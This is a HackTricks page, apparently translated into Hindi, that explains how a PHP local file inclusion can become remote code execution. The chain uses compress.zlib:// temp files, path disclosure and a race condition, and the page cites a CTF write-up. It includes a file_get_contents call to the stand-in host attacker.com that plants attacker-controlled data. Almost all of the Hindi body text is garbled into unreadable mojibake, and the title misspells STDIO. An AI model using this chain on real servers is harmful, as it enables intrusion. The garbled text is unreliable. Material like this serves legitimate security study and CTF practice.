# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `compress.zlib://` ‡§î‡§∞ `PHP_STREAM_PREFER_STDIO`

`compress.zlib://` ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ñ‡•ã‡§≤‡§æ ‡§ó‡§Ø‡§æ ‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤, `PHP_STREAM_PREFER_STDIO` ‡§ß‡•ç‡§µ‡§ú ‡§ï‡•á ‡§∏‡§æ‡§•, ‡§¨‡§æ‡§¶ ‡§Æ‡•á‡§Ç ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§™‡§∞ ‡§Ü‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§â‡§∏‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§®‡§æ ‡§ú‡§æ‡§∞‡•Ä ‡§∞‡§ñ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§ï‡•â‡§≤ ‡§ú‡•à‡§∏‡•á:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
‡§è‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ú‡•ã http://attacker.com/file ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡•ã‡§ó‡§æ, ‡§´‡§ø‡§∞ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§á‡§∏ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§æ ‡§â‡§§‡•ç‡§§‡§∞ ‡§è‡§ï ‡§Æ‡§æ‡§®‡•ç‡§Ø HTTP ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¶‡•á ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ñ‡•Å‡§≤‡§æ ‡§∞‡§ñ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§ï‡•Å‡§õ ‡§∏‡§Æ‡§Ø ‡§¨‡§æ‡§¶ ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§°‡•á‡§ü‡§æ ‡§≠‡•á‡§ú ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§≠‡•Ä ‡§≤‡§ø‡§ñ‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§Ü‡§™ ‡§á‡§∏ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•ã php-src ‡§ï‡•ã‡§° ‡§ï‡•á ‡§á‡§∏ ‡§≠‡§æ‡§ó ‡§Æ‡•á‡§Ç main/streams/cast.c ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Race Condition to RCE

[**‡§Ø‡§π CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) ‡§™‡§ø‡§õ‡§≤‡•á ‡§ü‡•ç‡§∞‡§ø‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§π‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§

‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **‡§∂‡§ø‡§ï‡§æ‡§∞ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•ã ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•á ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§∏‡•á ‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ñ‡•ã‡§≤‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞‡•á‡§ó‡§æ **`compress.zlib`** ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è‡•§

**‡§ú‡§¨‡§ï‡§ø** ‡§Ø‡§π **‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§®** ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **‡§Ö‡§∏‡•ç‡§•‡§æ‡§Ø‡•Ä ‡§´‡§º‡§æ‡§á‡§≤** ‡§ï‡•á ‡§™‡§• ‡§ï‡•ã **‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§æ‡§≤** ‡§¶‡•á‡§ó‡§æ (‡§Ø‡§π ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§≤‡•Ä‡§ï ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à)‡•§

**‡§ú‡§¨‡§ï‡§ø** **‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§®** ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§ñ‡•Å‡§≤‡§æ ‡§π‡•à, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **LFI ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡•ã ‡§Ö‡§∏‡•ç‡§•‡§æ‡§Ø‡•Ä ‡§´‡§º‡§æ‡§á‡§≤** ‡§ï‡•ã ‡§≤‡•ã‡§° ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§µ‡§π ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§ú‡§æ‡§Ç‡§ö ‡§π‡•à ‡§ú‡•ã **`<?`** ‡§µ‡§æ‡§≤‡•á ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•ã ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§∏‡•á **‡§∞‡•ã‡§ï‡§§‡•Ä** ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§®** ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§ó‡§æ‡•§ ‡§â‡§∏ ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§Æ‡•á‡§Ç ‡§ú‡•ã ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§ñ‡•Å‡§≤‡§æ ‡§π‡•à, **‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞** **PHP ‡§™‡•á‡§≤‡•ã‡§° ‡§≠‡•á‡§ú‡•á‡§ó‡§æ AFTER** **‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞** ‡§®‡•á **‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•Ä** ‡§ï‡§ø ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§∑‡§ø‡§¶‡•ç‡§ß ‡§µ‡§∞‡•ç‡§£ ‡§π‡•à‡§Ç ‡§≤‡•á‡§ï‡§ø‡§® **‡§á‡§∏‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§ï‡§ø ‡§Ø‡§π ‡§á‡§∏‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§≤‡•ã‡§° ‡§ï‡§∞‡•á**‡•§

‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§î‡§∞ CTF ‡§ï‡§æ ‡§µ‡§ø‡§µ‡§∞‡§£ ‡§¶‡•á‡§ñ‡•á‡§Ç [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
